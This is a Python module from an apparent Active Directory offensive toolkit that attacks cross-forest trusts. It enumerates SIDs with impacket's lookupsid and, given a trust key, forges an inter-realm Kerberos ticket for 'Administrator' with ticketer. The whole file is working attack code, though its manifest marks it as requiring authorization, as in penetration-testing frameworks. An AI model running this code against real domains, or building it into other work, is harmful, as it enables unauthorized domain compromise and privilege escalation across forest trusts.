"""Cross-forest trust exploitation via SID filtering bypass."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.trust.forest_trust_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["cross_forest_access"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1482"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    trust_key = getattr(args, "trust_key", None)

    print("[*] Forest Trust Abuse: {}".format(cred.domain))
    print("[*] Checking SID filtering configuration on forest trusts")

    import subprocess
    import shutil
    lookupsid = shutil.which("lookupsid.py") or shutil.which("impacket-lookupsid")
    if not lookupsid:
        print("[!] lookupsid.py (impacket) not found")
        return 1

    auth = cred.impacket_auth_string()
    cmd = [lookupsid, auth, "0"]
    if target:
        cmd += ["-target-ip", target]

    print("[*] Enumerating SIDs across forest trust")
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)

    if trust_key:
        print("[*] Inter-realm TGT forging with trust key")
        ticketer = shutil.which("ticketer.py") or shutil.which("impacket-ticketer")
        if ticketer:
            forge_cmd = [ticketer, "-nthash", trust_key, "-domain", cred.domain,
                         "-spn", "krbtgt/{}".format(getattr(args, "parent_domain", "TARGET.FOREST")),
                         "Administrator"]
            print("[*] CMD: {}".format(" ".join(forge_cmd)))
            r2 = subprocess.run(forge_cmd, capture_output=True, text=True)
            print(r2.stdout)

    return 0
